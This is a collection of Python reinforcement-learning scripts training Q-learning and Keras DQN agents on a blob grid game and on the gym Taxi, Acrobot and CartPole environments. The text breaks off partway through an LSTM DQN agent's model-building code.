import cv2 # showing the env
import matplotlib.pyplot as plt
import pickle
from matplotlib import style
import time
import os
from collections.abc import Iterable

style.use("ggplot")

GRID_SIZE = 10

# how many episodes 
EPISODES = 1_000
# how many steps in the env
STEPS = 200

# Rewards for differents events
MOVE_REWARD = -1
ENEMY_REWARD = -300
FOOD_REWARD = 30

epsilon = 0 # for randomness, it'll decay over time by EPSILON_DECAY
EPSILON_DECAY = 0.999993 # every episode, epsilon *= EPSILON_DECAY

SHOW_EVERY = 1

q_table = f"qtable-grid-{GRID_SIZE}-steps-{STEPS}.npy" # put here pretrained model ( if exists )

LEARNING_RATE = 0.1
DISCOUNT = 0.95

PLAYER_CODE = 1
FOOD_CODE = 2
ENEMY_CODE = 3

# blob dict, for colors
COLORS = {
    PLAYER_CODE: (255, 120, 0), # blueish color
    FOOD_CODE:   (0, 255, 0), # green
    ENEMY_CODE:  (0, 0, 255), # red
}


ACTIONS = {
    0: (0, 1),
    1: (-1, 0),
    2: (0, -1),
    3: (1, 0)
}

N_ENEMIES = 2

def get_observation(cords):
    obs = []
    for item1 in cords:
        for item2 in item1:
            obs.append(item2+GRID_SIZE-1)
    return tuple(obs)


class Blob:
    def __init__(self, name=None):
        self.x = np.random.randint(0, GRID_SIZE)
        self.y = np.random.randint(0, GRID_SIZE)
        self.name = name if name else "Blob"

    def __sub__(self, other):
        return (self.x - other.x, self.y - other.y)

    def __str__(self):
        return f"<{self.name.capitalize()} x={self.x}, y={self.y}>"

    def move(self, x=None, y=None):
        # if x is None, move randomly
        if x is None:
            self.x += np.random.randint(-1, 2)
        else:
            self.x += x
        
        # if y is None, move randomly
        if y is None:
            self.y += np.random.randint(-1, 2)
        else:
            self.y += y

        # out of bound fix
        if self.x < 0:
            # self.x = GRID_SIZE-1
            self.x = 0
        elif self.x > GRID_SIZE-1:
            # self.x = 0
            self.x = GRID_SIZE-1
        
        if self.y < 0:
            # self.y = GRID_SIZE-1
            self.y = 0
        elif self.y > GRID_SIZE-1:
            # self.y = 0
            self.y = GRID_SIZE-1

    def take_action(self, choice):
        # if choice == 0:
        #     self.move(x=1, y=1)
        # elif choice == 1:
        #     self.move(x=-1, y=-1)
        # elif choice == 2:
        #     self.move(x=-1, y=1)
        # elif choice == 3:
        #     self.move(x=1, y=-1)
        for code, (move_x, move_y) in ACTIONS.items():
            if choice == code:
                self.move(x=move_x, y=move_y)
        # if choice == 0:
        #     self.move(x=1, y=0)
        # elif choice == 1:
        #     self.move(x=0, y=1)
        # elif choice == 2:
        #     self.move(x=-1, y=0)
        # elif choice == 3:
        #     self.move(x=0, y=-1)

# construct the q_table if not already trained
if q_table is None or not os.path.isfile(q_table):
    # q_table = {}
    # # for every possible combination of the distance of the player
    # # to both the food and the enemy
    # for i in range(-GRID_SIZE+1, GRID_SIZE):
    #     for ii in range(-GRID_SIZE+1, GRID_SIZE):
    #         for iii in range(-GRID_SIZE+1, GRID_SIZE):
    #             for iiii in range(-GRID_SIZE+1, GRID_SIZE):
    #                 q_table[(i, ii), (iii, iiii)] = np.random.uniform(-5, 0, size=len(ACTIONS))
    q_table = np.random.uniform(-5, 0, size=[GRID_SIZE*2-1]*(2+2*N_ENEMIES) + [len(ACTIONS)])
else:
    # the q table already exists
    print("Loading Q-table")
    q_table = np.load(q_table)


# this list for tracking rewards
episode_rewards = []

# game loop
for episode in range(EPISODES):
    # initialize our blobs ( squares )
    player = Blob("Player")
    food   = Blob("Food")
    enemy1 = Blob("Enemy1")
    enemy2 = Blob("Enemy2")

    if episode % SHOW_EVERY == 0:
        print(f"[{episode:05}] ep: {epsilon:.4f} reward mean: {np.mean(episode_rewards[-SHOW_EVERY:])} alpha={LEARNING_RATE}")
        show = True
    else:
        show = False
    
    episode_reward = 0
    for i in range(STEPS):
        # get the observation
        obs = get_observation((player - food, player - enemy1, player - enemy2))
        # Epsilon-greedy policy
        if np.random.random() > epsilon:
            # get the action from the q table
            action = np.argmax(q_table[obs])
        else:
            # random action
            action = np.random.randint(0, len(ACTIONS))
        # take the action
        player.take_action(action)

        #### MAYBE ###
        #enemy.move()
        #food.move()
        ##############
        food.move()
        enemy1.move()
        enemy2.move()

        ### for rewarding
        if player.x == enemy1.x and player.y == enemy1.y:
            # if it hit the enemy, punish
            reward = ENEMY_REWARD
        elif player.x == enemy2.x and player.y == enemy2.y:
            # if it hit the enemy, punish
            reward = ENEMY_REWARD
        elif player.x == food.x and player.y == food.y:
            # if it hit the food, reward
            reward = FOOD_REWARD
        else:
            # else, punish it a little for moving
            reward = MOVE_REWARD

        ### calculate the Q
        # get the future observation after taking action
        future_obs = get_observation((player - food, player - enemy1, player - enemy2))
        # get the max future Q value (SarsaMax algorithm)
        # SARSA = State0, Action0, Reward0, State1, Action1
        max_future_q = np.max(q_table[future_obs])
        # get the current Q
        current_q = q_table[obs][action]
        # calculate the new Q
        if reward == FOOD_REWARD:
            new_q = FOOD_REWARD
        else:
            # value iteration update
            # https://en.wikipedia.org/wiki/Q-learning
            # Calculate the Temporal-Difference target
            td_target = reward + DISCOUNT * max_future_q
            # Temporal-Difference
            new_q = (1 - LEARNING_RATE) * current_q + LEARNING_RATE * td_target

        # update the q
        q_table[obs][action] = new_q


        if show:
            env = np.zeros((GRID_SIZE, GRID_SIZE, 3), dtype=np.uint8)
            # set food blob to green
            env[food.x][food.y] = COLORS[FOOD_CODE]
            # set the enemy blob to red
            env[enemy1.x][enemy1.y] = COLORS[ENEMY_CODE]
            env[enemy2.x][enemy2.y] = COLORS[ENEMY_CODE]
            # set the player blob to blueish
            env[player.x][player.y] = COLORS[PLAYER_CODE]
            # get the image
            image = Image.fromarray(env, 'RGB')
            image = image.resize((600, 600))
            # show the image
            cv2.imshow("image", np.array(image))
            if reward == FOOD_REWARD or reward == ENEMY_REWARD:
                if cv2.waitKey(500) == ord('q'):
                    break
            else:
                if cv2.waitKey(100) == ord('q'):
                    break
        
        episode_reward += reward
        if reward == FOOD_REWARD or reward == ENEMY_REWARD:
            break
        
    episode_rewards.append(episode_reward)
    # decay a little randomness in each episode
    epsilon *= EPSILON_DECAY
    


# with open(f"qtable-{int(time.time())}.pickle", "wb") as f:
#     pickle.dump(q_table, f)
np.save(f"qtable-grid-{GRID_SIZE}-steps-{STEPS}", q_table)

moving_avg = np.convolve(episode_rewards, np.ones((SHOW_EVERY,))/SHOW_EVERY, mode='valid')
plt.plot([i for i in range(len(moving_avg))], moving_avg)
plt.ylabel(f"Avg Reward every {SHOW_EVERY}")
plt.xlabel("Episode")
plt.show()




import numpy as np
import gym
import random
import matplotlib.pyplot as plt
import os
import time

env = gym.make("Taxi-v2").env

# init the Q-Table
# (500x6) matrix (n_states x n_actions)
q_table = np.zeros((env.observation_space.n, env.action_space.n))

# Hyper Parameters
# alpha
LEARNING_RATE = 0.1
# gamma
DISCOUNT_RATE = 0.9
EPSILON = 0.9
EPSILON_DECAY = 0.99993

EPISODES = 100_000
SHOW_EVERY = 1_000

# for plotting metrics
all_epochs = []
all_penalties = []
all_rewards = []

for i in range(EPISODES):
    
    # reset the env
    state = env.reset()

    epochs, penalties, rewards = 0, 0, []
    done = False

    while not done:
        if random.random() < EPSILON:
            # exploration
            action = env.action_space.sample()
        else:
            # exploitation
            action = np.argmax(q_table[state])

        next_state, reward, done, info = env.step(action)

        old_q = q_table[state, action]
        future_q = np.max(q_table[next_state])

        # calculate the new Q ( Q-Learning equation, i.e SARSAMAX )
        new_q = (1 - LEARNING_RATE) * old_q + LEARNING_RATE * ( reward + DISCOUNT_RATE * future_q)
        # update the new Q
        q_table[state, action] = new_q

        if reward == -10:
            penalties += 1
        
        state = next_state
        epochs += 1
        rewards.append(reward)

    

    if i % SHOW_EVERY == 0:
        print(f"[{i}] avg reward:{np.average(all_rewards):.4f} eps:{EPSILON:.4f}")
        # env.render()

    all_epochs.append(epochs)
    all_penalties.append(penalties)
    all_rewards.append(np.average(rewards))

    EPSILON *= EPSILON_DECAY

# env.render()
# plt.plot(list(range(len(all_rewards))), all_rewards)
# plt.show()

print("Playing in 5 seconds...")
time.sleep(5)
os.system("cls") if "nt" in os.name else os.system("clear")
# render

state = env.reset()
done = False
while not done:
    action = np.argmax(q_table[state])
    state, reward, done, info = env.step(action)
    env.render()
    time.sleep(0.2)
    os.system("cls") if "nt" in os.name else os.system("clear")
    
env.render()




import cv2
from PIL import Image

import os
# to use CPU uncomment below code
# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=5,
#                         inter_op_parallelism_threads=5, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
#                        )
import random
import gym
import numpy as np
import matplotlib.pyplot as plt
from collections import deque
from keras.models import Sequential
from keras.layers import Dense, Conv2D, MaxPooling2D, Dropout, Activation, Flatten
from keras.optimizers import Adam


EPISODES = 5_000
REPLAY_MEMORY_MAX = 20_000
MIN_REPLAY_MEMORY = 1_000

SHOW_EVERY = 50
RENDER_EVERY = 100
LEARN_EVERY = 50

GRID_SIZE = 20
ACTION_SIZE = 9


class Blob:
    def __init__(self, size):
        self.size = size
        self.x = np.random.randint(0, size)
        self.y = np.random.randint(0, size)

    def __str__(self):
        return f"Blob ({self.x}, {self.y})"

    def __sub__(self, other):
        return (self.x-other.x, self.y-other.y)

    def __eq__(self, other):
        return self.x == other.x and self.y == other.y

    def action(self, choice):
        '''
        Gives us 9 total movement options. (0,1,2,3,4,5,6,7,8)
        '''
        if choice == 0:
            self.move(x=1, y=1)
        elif choice == 1:
            self.move(x=-1, y=-1)
        elif choice == 2:
            self.move(x=-1, y=1)
        elif choice == 3:
            self.move(x=1, y=-1)

        elif choice == 4:
            self.move(x=1, y=0)
        elif choice == 5:
            self.move(x=-1, y=0)

        elif choice == 6:
            self.move(x=0, y=1)
        elif choice == 7:
            self.move(x=0, y=-1)

        elif choice == 8:
            self.move(x=0, y=0)

    def move(self, x=False, y=False):

        # If no value for x, move randomly
        if not x:
            self.x += np.random.randint(-1, 2)
        else:
            self.x += x

        # If no value for y, move randomly
        if not y:
            self.y += np.random.randint(-1, 2)
        else:
            self.y += y

        # If we are out of bounds, fix!
        if self.x < 0:
            self.x = 0
        elif self.x > self.size-1:
            self.x = self.size-1
        if self.y < 0:
            self.y = 0
        elif self.y > self.size-1:
            self.y = self.size-1


class BlobEnv:
    RETURN_IMAGES = True
    MOVE_PENALTY = 1
    ENEMY_PENALTY = 300
    FOOD_REWARD = 25
    
    ACTION_SPACE_SIZE = 9
    PLAYER_N = 1  # player key in dict
    FOOD_N = 2  # food key in dict
    ENEMY_N = 3  # enemy key in dict
    # the dict! (colors)
    d = {1: (255, 175, 0),
         2: (0, 255, 0),
         3: (0, 0, 255)}

    def __init__(self, size):
        self.SIZE = size
        self.OBSERVATION_SPACE_VALUES = (self.SIZE, self.SIZE, 3)  # 4

    def reset(self):
        self.player = Blob(self.SIZE)
        self.food = Blob(self.SIZE)
        while self.food == self.player:
            self.food = Blob(self.SIZE)
        self.enemy = Blob(self.SIZE)
        while self.enemy == self.player or self.enemy == self.food:
            self.enemy = Blob(self.SIZE)

        self.episode_step = 0

        if self.RETURN_IMAGES:
            observation = np.array(self.get_image())
        else:
            observation = (self.player-self.food) + (self.player-self.enemy)
        return observation

    def step(self, action):
        self.episode_step += 1
        self.player.action(action)

        #### MAYBE ###
        #enemy.move()
        #food.move()
        ##############

        if self.RETURN_IMAGES:
            new_observation = np.array(self.get_image())
        else:
            new_observation = (self.player-self.food) + (self.player-self.enemy)

        if self.player == self.enemy:
            reward = -self.ENEMY_PENALTY
            done = True
        elif self.player == self.food:
            reward = self.FOOD_REWARD
            done = True
        else:
            reward = -self.MOVE_PENALTY
            if self.episode_step < 200:
                done = False
            else:
                done = True

        return new_observation, reward, done

    def render(self):
        img = self.get_image()
        img = img.resize((300, 300))  # resizing so we can see our agent in all its glory.
        cv2.imshow("image", np.array(img))  # show it!
        cv2.waitKey(1)

    # FOR CNN #
    def get_image(self):
        env = np.zeros((self.SIZE, self.SIZE, 3), dtype=np.uint8)  # starts an rbg of our size
        env[self.food.x][self.food.y] = self.d[self.FOOD_N]  # sets the food location tile to green color
        env[self.enemy.x][self.enemy.y] = self.d[self.ENEMY_N]  # sets the enemy location to red
        env[self.player.x][self.player.y] = self.d[self.PLAYER_N]  # sets the player tile to blue
        img = Image.fromarray(env, 'RGB')  # reading to rgb. Apparently. Even tho color definitions are bgr. ???
        return img


class DQNAgent:
    def __init__(self, state_size, action_size):
        self.state_size = state_size
        self.action_size = action_size
        self.memory = deque(maxlen=REPLAY_MEMORY_MAX)
        # discount rate
        self.gamma = 0.95
        # exploration rate
        self.epsilon = 1.0
        self.epsilon_min = 0.01
        self.epsilon_decay = 0.9997
        self.learning_rate = 0.001
        # models to be built
        # Dual
        self.model = self.build_model()
        self.target_model = self.build_model()
        self.update_target_model()

    def build_model(self):
        """Builds the DQN Model"""
        # Neural network for Deep-Q Learning Model
        model = Sequential()
        model.add(Conv2D(256, (3, 3), input_shape=self.state_size))
        model.add(Activation("relu"))
        model.add(MaxPooling2D(pool_size=(2, 2)))
        model.add(Dropout(0.2))

        model.add(Conv2D(256, (3, 3)))
        model.add(Activation("relu"))
        model.add(MaxPooling2D(pool_size=(2, 2)))
        model.add(Dropout(0.2))

        model.add(Flatten())  # this converts our 3D feature maps to 1D feature vectors
        model.add(Dense(32))
        # output layer
        model.add(Dense(self.action_size, activation="linear"))
        model.compile(loss="mse", optimizer=Adam(lr=self.learning_rate))
        return model

    def update_target_model(self):
        """Copy weights from self.model to self.target_model"""
        self.target_model.set_weights(self.model.get_weights())
    
    def remember(self, state, action, reward, next_state, done):
        """Adds a sample to the memory"""
        # for images, expand dimension, comment if you are not using images as states
        state = state / 255
        next_state = next_state / 255
        state = np.expand_dims(state, axis=0)
        next_state = np.expand_dims(next_state, axis=0)
        self.memory.append((state, action, reward, next_state, done))

    def act(self, state):
        """Takes action using Epsilon-Greedy Policy"""
        if np.random.random() <= self.epsilon:
            return random.randint(0, self.action_size-1)
        else:
            state = state / 255
            state = np.expand_dims(state, axis=0)
            act_values = self.model.predict(state)
            # print("act_values:", act_values.shape)
            return np.argmax(act_values[0])

    def replay(self, batch_size):
        """Train on a replay memory with a batch_size of samples"""
        if len(self.memory) < MIN_REPLAY_MEMORY:
            return
        minibatch = random.sample(self.memory, batch_size)
        for state, action, reward, next_state, done in minibatch:
            target = reward
            if not done:
                target = ( reward + self.gamma * np.max(self.target_model.predict(next_state)[0]) )
            target_f = self.model.predict(state)
            target_f[0][action] = target
            self.model.fit(state, target_f, epochs=1, verbose=0, batch_size=1)
        # decay epsilon if possible
        self.epsilon = max(self.epsilon * self.epsilon_decay, self.epsilon_min)

    def load(self, name):
        self.model.load_weights(name)
        self.target_model.load_weights(name)

    def save(self, name):
        self.model.save_weights(name)
        self.target_model.save_weights(name)


if __name__ == "__main__":
    batch_size = 64
    env = BlobEnv(GRID_SIZE)
    agent = DQNAgent(env.OBSERVATION_SPACE_VALUES, ACTION_SIZE)
    ep_rewards = deque([-200], maxlen=SHOW_EVERY)
    avg_rewards = []
    min_rewards = []
    max_rewards = []
    for episode in range(1, EPISODES+1):
        # restarting episode => reset episode reward and step number
        episode_reward = 0
        step = 1

        # reset env and get init state
        current_state = env.reset()

        done = False
        while True:
            # take action 
            action = agent.act(current_state)
            next_state, reward, done = env.step(action)

            episode_reward += reward

            if episode % RENDER_EVERY == 0:
                env.render()
            
            # add transition to agent's memory
            agent.remember(current_state, action, reward, next_state, done)
            if step % LEARN_EVERY == 0:
                agent.replay(batch_size=batch_size)
            current_state = next_state
            step += 1

            if done:
                agent.update_target_model()
                break
        
        ep_rewards.append(episode_reward)
        avg_reward = np.mean(ep_rewards)
        min_reward = min(ep_rewards)
        max_reward = max(ep_rewards)
        
        avg_rewards.append(avg_reward)
        min_rewards.append(min_reward)
        max_rewards.append(max_reward)
        print(f"[{episode}] avg:{avg_reward:.2f} min:{min_reward} max:{max_reward} eps:{agent.epsilon:.4f}")
        # if episode % SHOW_EVERY == 0:
            # print(f"[{episode}] avg: {avg_reward} min: {min_reward} max: {max_reward} eps: {agent.epsilon:.4f}")
    
    episodes = list(range(EPISODES))
    plt.plot(episodes, avg_rewards, c='b')
    plt.plot(episodes, min_rewards, c='r')
    plt.plot(episodes, max_rewards, c='g')
    plt.show()
    agent.save("blob_v1.h5")




import os
# to use CPU uncomment below code
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
import random
import gym
import numpy as np
import matplotlib.pyplot as plt
from collections import deque
from keras.models import Sequential
from keras.layers import Dense
from keras.optimizers import Adam


EPISODES = 5_000
REPLAY_MEMORY_MAX = 2_000

SHOW_EVERY = 500
RENDER_EVERY = 1_000

class DQNAgent:
    def __init__(self, state_size, action_size):
        self.state_size = state_size
        self.action_size = action_size
        self.memory = deque(maxlen=REPLAY_MEMORY_MAX)
        # discount rate
        self.gamma = 0.95
        # exploration rate
        self.epsilon = 1.0
        self.epsilon_min = 0.01
        self.epsilon_decay = 0.9997
        self.learning_rate = 0.001
        # models to be built
        # Dual
        self.model = self.build_model()
        self.target_model = self.build_model()
        self.update_target_model()

    def build_model(self):
        """Builds the DQN Model"""
        # Neural network for Deep-Q Learning Model
        model = Sequential()
        model.add(Dense(32, input_dim=self.state_size, activation="relu"))
        model.add(Dense(32, activation="relu"))
        # output layer
        model.add(Dense(self.action_size, activation="linear"))
        model.compile(loss="mse", optimizer=Adam(lr=self.learning_rate))
        return model

    def update_target_model(self):
        """Copy weights from self.model to self.target_model"""
        self.target_model.set_weights(self.model.get_weights())
    
    def remember(self, state, action, reward, next_state, done):
        """Adds a sample to the memory"""
        self.memory.append((state, action, reward, next_state, done))

    def act(self, state):
        """Takes action using Epsilon-Greedy Policy"""
        if np.random.random() <= self.epsilon:
            return random.randint(0, self.action_size-1)
        else:
            act_values = self.model.predict(state)
            # print("act_values:", act_values.shape)
            return np.argmax(act_values[0])

    def replay(self, batch_size):
        """Train on a replay memory with a batch_size of samples"""
        minibatch = random.sample(self.memory, batch_size)
        for state, action, reward, next_state, done in minibatch:
            target = reward
            if not done:
                target = ( reward + self.gamma * np.max(self.target_model.predict(next_state)[0]) )
            target_f = self.model.predict(state)
            target_f[0][action] = target
            self.model.fit(state, target_f, epochs=1, verbose=0)
        # decay epsilon if possible
        self.epsilon = max(self.epsilon * self.epsilon_decay, self.epsilon_min)

    def load(self, name):
        self.model.load_weights(name)
        self.target_model.load_weights(name)

    def save(self, name):
        self.model.save_weights(name)
        self.target_model.save_weights(name)

    
if __name__ == "__main__":
    env = gym.make("Acrobot-v1")
    state_size = env.observation_space.shape[0]
    action_size = env.action_space.n
    agent = DQNAgent(state_size=state_size, action_size=action_size)
    # agent.load("AcroBot_v1.h5")
    done = False
    batch_size = 32

    all_rewards = deque(maxlen=SHOW_EVERY)
    avg_rewards = []
    
    for e in range(EPISODES):
        state = env.reset()
        state = np.reshape(state, (1, state_size))
        rewards = 0
        while True:
            action = agent.act(state)
            # print(action)
            next_state, reward, done, info = env.step(action)
            # punish if not yet finished
            # reward = reward if not done else 10
            next_state = np.reshape(next_state, (1, state_size))
            agent.remember(state, action, reward, next_state, done)
            state = next_state
            if done:
                agent.update_target_model()
                break
            if e % RENDER_EVERY == 0:
                env.render()
            rewards += reward
            # print(rewards)
        all_rewards.append(rewards)
        avg_reward = np.mean(all_rewards)
        avg_rewards.append(avg_reward)
        if e % SHOW_EVERY == 0:
            print(f"[{e:4}] avg reward:{avg_reward:.3f} eps: {agent.epsilon:.2f}")
        if len(agent.memory) > batch_size:
            agent.replay(batch_size)
            
    agent.save("AcroBot_v1.h5")
    plt.plot(list(range(EPISODES)), avg_rewards)
    plt.show()




import os
# to use CPU uncomment below code
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
import random
import gym
import numpy as np
import matplotlib.pyplot as plt
from collections import deque
from keras.models import Sequential
from keras.layers import Dense
from keras.optimizers import Adam


EPISODES = 1000
REPLAY_MEMORY_MAX = 5000

SHOW_EVERY = 100

class DQNAgent:
    def __init__(self, state_size, action_size):
        self.state_size = state_size
        self.action_size = action_size
        self.memory = deque(maxlen=REPLAY_MEMORY_MAX)
        # discount rate
        self.gamma = 0.95
        # exploration rate
        self.epsilon = 1.0
        self.epsilon_min = 0.01
        self.epsilon_decay = 0.995
        self.learning_rate = 0.001
        # model to be built
        self.model = None
        self.build_model()

    def build_model(self):
        """Builds the DQN Model"""
        # Neural network for Deep-Q Learning Model
        model = Sequential()
        model.add(Dense(24, input_dim=self.state_size, activation="relu"))
        model.add(Dense(24, activation="relu"))
        # output layer
        model.add(Dense(self.action_size, activation="linear"))
        model.compile(loss="mse", optimizer=Adam(lr=self.learning_rate))
        self.model = model

    def remember(self, state, action, reward, next_state, done):
        """Adds a sample to the memory"""
        self.memory.append((state, action, reward, next_state, done))

    def act(self, state):
        """Takes action using Epsilon-Greedy Policy"""
        if np.random.random() <= self.epsilon:
            return random.randint(0, self.action_size-1)
        else:
            act_values = self.model.predict(state)
            # print("act_values:", act_values.shape)
            return np.argmax(act_values[0])

    def replay(self, batch_size):
        """Train on a replay memory with a batch_size of samples"""
        minibatch = random.sample(self.memory, batch_size)
        for state, action, reward, next_state, done in minibatch:
            target = reward
            if not done:
                target = ( reward + self.gamma * np.max(self.model.predict(next_state)[0]) )
            target_f = self.model.predict(state)
            target_f[0][action] = target
            self.model.fit(state, target_f, epochs=1, verbose=0)
        # decay epsilon if possible
        self.epsilon = max(self.epsilon * self.epsilon_decay, self.epsilon_min)

    def load(self, name):
        self.model.load_weights(name)

    def save(self, name):
        self.model.save_weights(name)

    
if __name__ == "__main__":
    env = gym.make("CartPole-v1")
    state_size = env.observation_space.shape[0]
    action_size = env.action_space.n
    agent = DQNAgent(state_size=state_size, action_size=action_size)

    done = False
    batch_size = 32

    scores = []
    avg_scores = []
    avg_score = 0
    for e in range(EPISODES):
        state = env.reset()
        state = np.reshape(state, (1, state_size))
        
        for t in range(500):
            action = agent.act(state)
            # print(action)
            next_state, reward, done, info = env.step(action)
            # punish if not yet finished
            reward = reward if not done else -10
            next_state = np.reshape(next_state, (1, state_size))
            agent.remember(state, action, reward, next_state, done)
            state = next_state
            if done:
                print(f"[{e:4}] avg score:{avg_score:.3f} eps: {agent.epsilon:.2f}")
                break
            if e % SHOW_EVERY == 0:
                env.render()
        if len(agent.memory) > batch_size:
            agent.replay(batch_size)
        scores.append(t)
        
        avg_score = np.average(scores)
        avg_scores.append(avg_score)
            
    agent.save("v1.h5")
    plt.plot(list(range(EPISODES)), avg_scores)
    plt.show()




import numpy as np
import keras.backend.tensorflow_backend as backend
from keras.models import Sequential
from keras.layers import Dense, Dropout, Conv2D, MaxPooling2D, Activation, Flatten, LSTM
from keras.optimizers import Adam
from keras.callbacks import TensorBoard
import tensorflow as tf
from collections import deque
import time
import random
from tqdm import tqdm
import os
from PIL import Image
import cv2
import itertools


DISCOUNT = 0.96
REPLAY_MEMORY_SIZE = 50_000  # How many last steps to keep for model training
MIN_REPLAY_MEMORY_SIZE = 1_000  # Minimum number of steps in a memory to start training
MINIBATCH_SIZE = 32  # How many steps (samples) to use for training
UPDATE_TARGET_EVERY = 5  # Terminal states (end of episodes)
MODEL_NAME = '3x128-LSTM-7enemies-'
MIN_REWARD = -200  # For model save
MEMORY_FRACTION = 0.20

# Environment settings
EPISODES = 50_000

# Exploration settings
epsilon = 1.0  # not a constant, going to be decayed
EPSILON_DECAY = 0.999771
MIN_EPSILON = 0.01

#  Stats settings
AGGREGATE_STATS_EVERY = 100  # episodes
SHOW_PREVIEW = False


class Blob:
    def __init__(self, size):
        self.size = size
        self.x = np.random.randint(0, size)
        self.y = np.random.randint(0, size)

    def __str__(self):
        return f"Blob ({self.x}, {self.y})"

    def __sub__(self, other):
        return (self.x-other.x, self.y-other.y)

    def __eq__(self, other):
        return self.x == other.x and self.y == other.y

    def action(self, choice):
        '''
        Gives us 9 total movement options. (0,1,2,3,4,5,6,7,8)
        '''
        if choice == 0:
            self.move(x=1, y=0)
        elif choice == 1:
            self.move(x=-1, y=0)
        elif choice == 2:
            self.move(x=0, y=1)
        elif choice == 3:
            self.move(x=0, y=-1)


    def move(self, x=False, y=False):

        # If no value for x, move randomly
        if x is False:
            self.x += np.random.randint(-1, 2)
        else:
            self.x += x

        # If no value for y, move randomly
        if y is False:
            self.y += np.random.randint(-1, 2)
        else:
            self.y += y

        # If we are out of bounds, fix!
        if self.x < 0:
            self.x = 0
        elif self.x > self.size-1:
            self.x = self.size-1
        if self.y < 0:
            self.y = 0
        elif self.y > self.size-1:
            self.y = self.size-1


class BlobEnv:
    SIZE = 20
    RETURN_IMAGES = False
    MOVE_PENALTY = 1
    ENEMY_PENALTY = 300
    FOOD_REWARD = 25
    # if RETURN_IMAGES:
    #     OBSERVATION_SPACE_VALUES = (SIZE, SIZE, 3)  # 4
    # else:
    #     OBSERVATION_SPACE_VALUES = (4,)
    ACTION_SPACE_SIZE = 4
    PLAYER_N = 1  # player key in dict
    FOOD_N = 2  # food key in dict
    ENEMY_N = 3  # enemy key in dict
    # the dict! (colors)
    d = {1: (255, 175, 0),
         2: (0, 255, 0),
         3: (0, 0, 255)}

    def __init__(self, n_enemies=7):
        self.n_enemies = n_enemies
        self.n_states = len(self.reset())

    def reset(self):
        self.enemies = []
        self.player = Blob(self.SIZE)
        self.food = Blob(self.SIZE)
        while self.food == self.player:
            self.food = Blob(self.SIZE)
        for i in range(self.n_enemies):
            enemy = Blob(self.SIZE)
            while enemy == self.player or enemy == self.food:
                enemy = Blob(self.SIZE)
            self.enemies.append(enemy)

        self.episode_step = 0

        if self.RETURN_IMAGES:
            observation = np.array(self.get_image())
        else:
            # all blob's coordinates
            observation = [self.player.x, self.player.y, self.food.x, self.food.y] + list(itertools.chain(*[[e.x, e.y] for e in self.enemies]))
        return observation

    def step(self, action):
        self.episode_step += 1
        self.player.action(action)

        #### MAYBE ###
        #enemy.move()
        #food.move()
        ##############

        if self.RETURN_IMAGES:
            new_observation = np.array(self.get_image())
        else:
            new_observation = [self.player.x, self.player.y, self.food.x, self.food.y] + list(itertools.chain(*[[e.x, e.y] for e in self.enemies]))

        # set the reward to move penalty by default
        reward = -self.MOVE_PENALTY

        if self.player == self.food:
            # if the player hits the food, good reward
            reward = self.FOOD_REWARD
        else:
            for enemy in self.enemies:
                if enemy == self.player:
                    # if the player hits one of the enemies, heavy punishment
                    reward = -self.ENEMY_PENALTY
                    break

        done = False
        if reward == self.FOOD_REWARD or reward == -self.ENEMY_PENALTY or self.episode_step >= 200:
            done = True
        return new_observation, reward, done

    def render(self):
        img = self.get_image()
        img = img.resize((300, 300))  # resizing so we can see our agent in all its glory.
        cv2.imshow("image", np.array(img))  # show it!
        cv2.waitKey(1)

    # FOR CNN #
    def get_image(self):
        env = np.zeros((self.SIZE, self.SIZE, 3), dtype=np.uint8)  # starts an rbg of our size
        env[self.food.x][self.food.y] = self.d[self.FOOD_N]  # sets the food location tile to green color
        for enemy in self.enemies:
            env[enemy.x][enemy.y] = self.d[ENEMY_N]  # sets the enemy location to red
        env[self.player.x][self.player.y] = self.d[self.PLAYER_N]  # sets the player tile to blue
        img = Image.fromarray(env, 'RGB')  # reading to rgb. Apparently. Even tho color definitions are bgr. ???
        return img


env = BlobEnv()

# For stats
ep_rewards = [-200]

# For more repetitive results
random.seed(1)
np.random.seed(1)
tf.set_random_seed(1)

# Memory fraction, used mostly when trai8ning multiple agents
#gpu_options = tf.GPUOptions(per_process_gpu_memory_fraction=MEMORY_FRACTION)
#backend.set_session(tf.Session(config=tf.ConfigProto(gpu_options=gpu_options)))

# Create models folder
if not os.path.isdir('models'):
    os.makedirs('models')


# Own Tensorboard class
class ModifiedTensorBoard(TensorBoard):

    # Overriding init to set initial step and writer (we want one log file for all .fit() calls)
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.step = 1
        self.writer = tf.summary.FileWriter(self.log_dir)

    # Overriding this method to stop creating default log writer
    def set_model(self, model):
        pass

    # Overrided, saves logs with our step number
    # (otherwise every .fit() will start writing from 0th step)
    def on_epoch_end(self, epoch, logs=None):
        self.update_stats(**logs)

    # Overrided
    # We train for one batch only, no need to save anything at epoch end
    def on_batch_end(self, batch, logs=None):
        pass

    # Overrided, so won't close writer
    def on_train_end(self, _):
        pass

    # Custom method for saving own metrics
    # Creates writer, writes custom metrics and closes writer
    def update_stats(self, **stats):
        self._write_logs(stats, self.step)


# Agent class
class DQNAgent:
    def __init__(self, state_in_image=True):

        self.state_in_image = state_in_image

        # Main model
        self.model = self.create_model()

        # Target network
        self.target_model = self.create_model()
        self.target_model.set_weights(self.model.get_weights())

        # An array with last n steps for training
        self.replay_memory = deque(maxlen=REPLAY_MEMORY_SIZE)

        # Custom tensorboard object
        self.tensorboard = ModifiedTensorBoard(log_dir="logs/{}-{}".format(MODEL_NAME, int(time.time())))

        # Used to count when to update target network with main network's weights
        self.target_update_counter = 0

    def create_model(self):
        # get the NN input length
        model = Sequential()
        if self.state_in_image:
